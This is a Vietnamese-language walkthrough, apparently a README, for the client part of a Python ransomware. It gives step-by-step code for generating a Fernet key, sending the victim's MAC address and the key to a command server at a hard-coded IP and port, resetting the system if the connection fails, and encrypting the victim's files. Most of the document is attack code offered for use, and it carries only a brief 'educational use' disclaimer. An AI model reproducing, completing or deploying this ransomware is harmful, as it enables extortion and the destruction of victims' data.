# Hướng dẫn chi tiết Client 

Module Python này triển khai một ransomware đơn giản kết nối với máy chủ, mã hóa tệp và giải mã chúng bằng thuật toán mã hóa Fernet. Để sử dụng ransomware, trước tiên hãy nhập các Module cần thiết, bao gồm thời gian, tiện ích hệ thống, công cụ mã hóa và giao tiếp ổ cắm. Sau đó, định nghĩa lớp `Ransomware`, khởi tạo nó với máy chủ và cổng của máy chủ. Kết nối với máy chủ bằng phương pháp `ConnectServer`, phương pháp này cố gắng thiết lập kết nối và gửi thông tin hệ thống cùng với khóa mã hóa. Sau khi kết nối, bạn có thể mã hóa các tệp bằng phương pháp `Encrypted` và giải mã chúng bằng phương pháp `Decrypted`. Cuối cùng, khởi tạo lớp `Ransomware` và thực thi tập lệnh ransomware, đảm bảo rằng máy chủ và cổng của máy chủ được định cấu hình chính xác.

1. **Import the necessary modules**:
   ```python
   from time import sleep
   from modules.system import System
   from modules.encdec import Fernet, Encrypt, Decrypt
   from socket import socket, AF_INET, SOCK_STREAM
   ```
- Module Python này triển khai một ransomware đơn giản kết nối với máy chủ, mã hóa tệp và giải mã chúng bằng thuật toán mã hóa Fernet.

2. **Class Ransomware**:
    ```python
    def __init__(self, host: str, port: int) -> None:
        self.key = Fernet.generate_key()
        self.host = host
        self.port = port
        self.system: System = System()
        self.server: socket = socket(AF_INET, SOCK_STREAM)
        self.Private = Fernet(self.key)
    ```
- Tạo khóa mã hóa ngẫu nhiên, khởi tạo đối tượng `System`.
- Tạo một `socket` để giao tiếp và một thể hiện `Fernet` để mã hóa/giải mã.

    ```python
    def ConnectServer(self, connected = False) -> None:
        retries = 0
        while not connected and retries < 3:
            try:
                self.server.connect((self.host, self.port))
                self.server.sendall(f'{self.system.Mac()}|{self.key.decode("utf-8")}'.encode('utf-8'))
                connected = True
            except:
                retries += 1
                if retries < 3:
                    sleep(10)
                else:
                    System.reset()
            finally:
                self.server.close()
    ```
 - Phương thức `ConnectServer` cố gắng kết nối với máy chủ thông qua địa chỉ IP và cổng được cung cấp. Nếu không thể kết nối sau 3 lần thử, hệ thống sẽ được đặt lại.

    ```python
    def Encrypted(self):
        Encrypt(self.Private)
    
    def Decrypted(self):
        Decrypt(self.Private)
    ```
 - Phương thức `Encrypted` sẽ mã hóa dữ liệu sử dụng khóa riêng tư đã được tạo.
 - Phương thức `Decrypted` sẽ giải mã dữ liệu đã được mã hóa sử dụng cùng một khóa.
    
    ```python
    if __name__ == '__main__':
        bot = Ransomware('192.168.1.12', 19100)
        bot.ConnectServer()
        bot.Encrypted()
    ```
 - Khi khởi tạo một đối tượng `Ransomware`, bạn cần cung cấp địa chỉ IP (`host`) và cổng (`port`) của máy chủ mà bạn muốn kết nối đến.


**Lưu ý**: *Mã này chỉ nên được sử dụng cho mục đích học tập. Sử dụng nó để thực hiện các hoạt động phi pháp (như tấn công mạng) có thể dẫn đến hậu quả pháp lý nghiêm trọng. Luôn tuân thủ các quy định pháp lý khi sử dụng và phát triển mã nguồn mở.*